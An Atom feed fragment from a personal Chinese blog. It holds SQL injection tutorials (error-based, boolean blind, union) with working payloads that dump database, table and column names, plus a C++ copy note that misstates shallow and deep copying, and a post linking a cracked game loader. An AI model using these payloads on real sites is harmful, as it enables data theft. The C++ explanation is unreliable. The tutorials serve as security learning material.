    <summary type="html">&lt;h3 id=&quot;SQL时间注入&quot;&gt;&lt;a href=&quot;#SQL时间注入&quot; class=&quot;headerlink&quot; title=&quot;SQL时间注入&quot;&gt;&lt;/a&gt;SQL时间注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T03:37:00.000Z</published>
    <updated>2023-03-12T04:15:17.647Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’&lt;/p&gt;
&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL布尔盲注(延时注入后面再写)</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2023-03-12T02:39:00.000Z</published>
    <updated>2023-03-12T03:36:37.119Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。&lt;br&gt;或者为真时返回正常页面，为假时跳转到其它页面等。&lt;/p&gt;
&lt;h4</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL联合注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-11T16:47:00.000Z</published>
    <updated>2023-03-12T02:21:28.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL联合注入&quot;&gt;&lt;a href=&quot;#SQL联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL联合注入&quot;&gt;&lt;/a&gt;SQL联合注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入前置知识及注入原理</title>
    <link href="https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-11T15:09:00.000Z</published>
    <updated>2023-03-12T04:17:35.174Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h4&gt;&lt;p&gt;BurpSuite的及其拓展的安装及使用&lt;br&gt;SQLmap的下载及基本命令&lt;br&gt;了解少许PHP语言&lt;br&gt;&lt;strong</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>拷贝相关</title>
    <link href="https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/"/>
    <id>https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/</id>
    <published>2023-03-09T14:49:00.000Z</published>
    <updated>2023-03-09T15:04:25.321Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="本篇文章简要记录一下C-拷贝相关的知识以及误区。"><a href="#本篇文章简要记录一下C-拷贝相关的知识以及误区。" class="headerlink" title="本篇文章简要记录一下C++拷贝相关的知识以及误区。"></a>本篇文章简要记录一下C++拷贝相关的知识以及误区。</h5><p>   <strong>首先上定义:</strong><br>   拷贝和浅拷贝是指在对对象一份复制或者复制某些部分时所表现出来的差异。</p><p>   浅拷贝只复制对象的引用，由于是引用，所以当拷贝对象中的属性变化时，原始对象和拷贝对象共享这些属性的变化，也就是说，拷贝对象的属性变化会影响到原始对象的属性。因为是浅拷贝，所以拷贝的对象和原来的对象不是两个的独立存在，而是共享数据存储空间。</p><p>   深拷贝则是在复制对象的指针引用的同时，完全复制一份内容相同的对象。也就是说，深度拷贝会创建一个新的对象，而不仅仅是拷贝其指针引用，因此，它们的变化互不影响。人们可以自由操作两个对象，而不会对另一个产生影响。因此，深拷贝能够完整地承载原对象所有信息。这个复制后的对象与原对象彻底分离，内存空间也不同了。</p><p>   简单地说:浅拷贝会影响原有的数据，相当于做了路径引用；深拷贝是另外开辟了内存空间，相当于复制了一个。</p><p>   <strong>然后是一个比较大的误区(可能是我比较菜所以搞不懂):</strong><br>   使用指针传递值是浅拷贝。</p><p>   当使用指针传递值时，函数参数传递的是指针所指向的内存地址，而不是实际的变量本身。因此，函数内部对于指针所指向的数据进行的操作，会直接影响到原始数据，属于浅拷贝。</p><p>   如果需要进行深拷贝，可以使用其他方式，比如使用引用传递或者复制构造函数等。</p><p><strong>上代码才看得懂！</strong></p><pre class="line-numbers language-c++"><code class="language-c++">指针可以直接访问和修改原数据的地址，从而实现更改原数据。具体操作步骤如下：1. 定义指针变量并初始化为原数据的地址：int data = 10;int* pData = &data;2. 通过指针访问和修改原数据：*pData = 20;  // 将原数据修改为20完整示例代码如下：#include <iostream>using namespace std;int main() &#123;    int data = 10;    int* pData = &data;    cout << "原数据：" << data << endl;    *pData = 20;    cout << "更改后的数据：" << data << endl;    return 0;&#125;输出结果为：原数据：10更改后的数据：20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="今天就这么多，写作业去了。"><a href="#今天就这么多，写作业去了。" class="headerlink" title="今天就这么多，写作业去了。"></a>今天就这么多，写作业去了。</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;本篇文章简要记录一下C-拷贝相关的知识以及误区。&quot;&gt;&lt;a href=&quot;#本篇文章简要记录一下C-拷贝相关的知识以及</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Arcaea</title>
    <link href="https://liu1272.github.io/2023/03/08/Arcaea/"/>
    <id>https://liu1272.github.io/2023/03/08/Arcaea/</id>
    <published>2023-03-07T16:05:00.000Z</published>
    <updated>2023-03-08T16:13:09.309Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Final-Verdict"><a href="#Final-Verdict" class="headerlink" title="Final Verdict"></a>Final Verdict</h3><p><img src="https://s2.loli.net/2023/03/09/hOT6eWV85gIwX1j.jpg" alt="第一个必须得是咲弥！"><br><img src="https://s2.loli.net/2023/03/09/NKS61Q3PV8spoIL.jpg" alt="光光怎么哭了呜呜呜"><br><img src="https://s2.loli.net/2023/03/09/zNcPyYS5qmhxXnR.jpg" alt="我可怜的光光"><br><img src="https://s2.loli.net/2023/03/09/gHa1KlTMLGfrCsx.jpg" alt="牵着我的手"><br><img src="https://s2.loli.net/2023/03/09/g6T9YwRuFqBNoHL.jpg" alt="目视崩溃的未来"><br><img src="https://s2.loli.net/2023/03/08/1SqIAni59T7bZ8y.png" alt="贴贴"><br><img src="https://s2.loli.net/2023/03/08/dU8i4P1BxQuTSCt.png" alt="Arcaea的残骸"><br><img src="https://s2.loli.net/2023/03/08/QGgLYvEh7TeakJI.png"><br><img src="https://s2.loli.net/2023/03/08/4ki3oUOtQI2FyRn.png"><br><img src="https://s2.loli.net/2023/03/08/cCpUPTDjX4KLrHi.png" alt="尾声"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Final-Verdict&quot;&gt;&lt;a href=&quot;#Final-Verdict&quot; class=&quot;headerlink&quot; title=&quot;Final Verdict&quot;&gt;&lt;/a&gt;Final Verdict&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.</summary>
      
    
    
    
    <category term="图片" scheme="https://liu1272.github.io/categories/%E5%9B%BE%E7%89%87/"/>
    
    
    <category term="图片" scheme="https://liu1272.github.io/tags/%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>喵斯？快跑！</title>
    <link href="https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/"/>
    <id>https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/</id>
    <published>2023-03-04T17:39:00.000Z</published>
    <updated>2023-03-04T18:24:17.353Z</updated>
    
    <content type="html"><![CDATA[<h5 id="这篇文章就是来吐槽musedash的！"><a href="#这篇文章就是来吐槽musedash的！" class="headerlink" title="这篇文章就是来吐槽musedash的！"></a>这篇文章就是来吐槽musedash的！</h5><p>该死的喵斯，你单单靠自己频繁的联动是注定无法长久地保存音游圈的流量的！<br>首先，那个该死的只能228软妹币一次性买断的曲包机制，<br>以及在各个平台的同一账号购买记录不互通就足够烦恼了。<br>然后，更难受的还得是资源封锁。<br>人家Phigros和Arcaea都有各自在民间广泛流传的自制谱渠道。<br>燃鹅你游官方不给就算了，还任由某个小团体封锁自制的资源。<br>甚至有考核乐理和游戏排行来决定玩家是否能够拥有写谱的资格。<br><strong>对此我只能说是离谱至极！</strong><br>自制铺面本应是趁兴而为。<br>但是，我为了导入一首I Got Smoke不得不加了三个喵斯群，一个考核群。<br>最后还是自己花了6个小时在互联网上找到各方零散资源，<br>再自行尝试修改才成功的。<br>如此可见，如果一个热爱喵斯而实力不强的玩家遇到这种情况，<br>那么将会是一盆冷水浇个透心凉！</p><p>下面的图你们自己看看吧。<br><img src="https://s2.loli.net/2023/03/05/fhio3NYLdr8bFHt.png" alt="载入mdmc"><br><img src="https://s2.loli.net/2023/03/05/Esnuw7XrcQkVjAq.png" alt="最后有折磨多"><br><img src="https://s2.loli.net/2023/03/05/f1KrcBpDX65T7Ow.png" alt="终于搞定了"></p><p>这里是阿里云盘的<a href="https://www.aliyundrive.com/s/UqrJ8R732JC">分享链接</a>，提取码是4qt8</p><p>下面是使用教程:<br>1.“下崽”并解压至没有中文的路径比如桌面(问为什么的找GPT去)<br>2.双击MuseDash文件夹里的那个steamclient_loader文件<br>3.千万不要点MuseDash这个应用程序(你爱试就逝咯)<br>4.如果成功运行，按Q找西瓜图标的自定义包就行了<br>5.如果卡了或命令行卡在下载某个zip文件那就Ctrl+C一下<br>6.实在不行就双击解压出来的另一个文件，选择MuseDash这个应用程序然后漫长等待。<br>7.上一步需要科学上网<br>8.如果按上面做都不行就去该博客GitHub仓库找我。</p><h5 id="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"><a href="#不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。" class="headerlink" title="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"></a>不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。</h5>]]></content>
    
    
      
      
